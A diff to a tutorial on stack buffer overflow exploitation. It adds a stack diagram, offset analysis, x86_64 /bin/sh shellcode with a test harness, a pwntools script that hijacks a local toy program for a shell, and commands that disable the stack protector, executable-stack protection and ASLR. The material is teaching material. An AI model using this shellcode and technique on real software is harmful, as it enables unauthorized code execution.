@@ -62,6 +62,12 @@ Now, we discuss a more general senario, i.e., 1) the attacker cannot obtain the 
 #### Stack Layout Analysis
 The purpose is to obtain the offset of the return address so that we can point it to the another code address, e.g., shell code. Let's still use our previous toy program for demonstration. The idea is to input several 'A's (hexdecimal ASCII: 0X41). If it has changed the return addresses, then the program will not be able to continue the execution and report the bad return address. We can gradually increase the length of the input to learn the offset of the return address. 
 
+| previous frame |
+|:--------------:|
+|   ret address  |
+|       ...      |
+|    AAAAAAAA    |
+
 Before experiments, we need to turn on the core dump message
 ```
 #: ulimit -c unlimited
@@ -81,9 +87,10 @@ Segmentation fault (core dumped)
 Program received signal SIGSEGV, Segmentation fault.
 0x0000000a41414141 in ?? ()
 ```
-The log message 
+The log message displays a segmentation fault caused by a invalid return address 0x0000000a41414141. Because there are four 'A's, we can know the offset of the return address should be 92-4=88. Note that if you try more a 'A's, the error message may not be 0x0000414141414141 but another different address because 0x0000414141414141 is an invalid code address to the OS.
 
 #### Design the Exploit 
+The following code is a shellcode snippts for x86_64, which executes system("/bin/sh"). 
 ```
 xor eax, eax
 mov 0xFF978CD091969DD1, rbx
@@ -100,6 +107,7 @@ mov 0x3b, al
 syscall
 ```
 
+We can test if the shellcode works via the following code. It first encodes and saves the shellcode as a char array, and then jumps to it as a function call.
 ```
 const char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
 
@@ -112,5 +120,38 @@ int main (void) {
 }
 ```
 
+If it works, we can inject the shellcode to the vulnerable program.
+```
+#! /usr/bin/env python
+from pwn import *
+
+ret = 0x7fffffffe1d0
+shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+payload = shellcode + "A" * (88-len(shellcode)) + p64(ret)
+p = process("./bug")
+p.send(payload)
+p.interactive()
+```
+
+Execute the attacking code. If you are lucky enough, you should be able to obtain the following result.
+```
+#: python hijack.py 
+[+] Starting local process './bug': pid 48788
+[*] Switching to interactive mode
+Input your key:Wrong key!
+$ whoami
+hui
+$ 
+```
+
+If not, it possibly means you are using the stack protector or the ASLR. Turn off the stack protector when compiling the buggy program to eable the data on the stack to be executable.
+```
+#: clang -fno-stack-protector -z execstack bug.c
+```
+
+You can also turn off the ASLR as following.
+```
+#: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
 
 ## Section 2. Protection Techniques
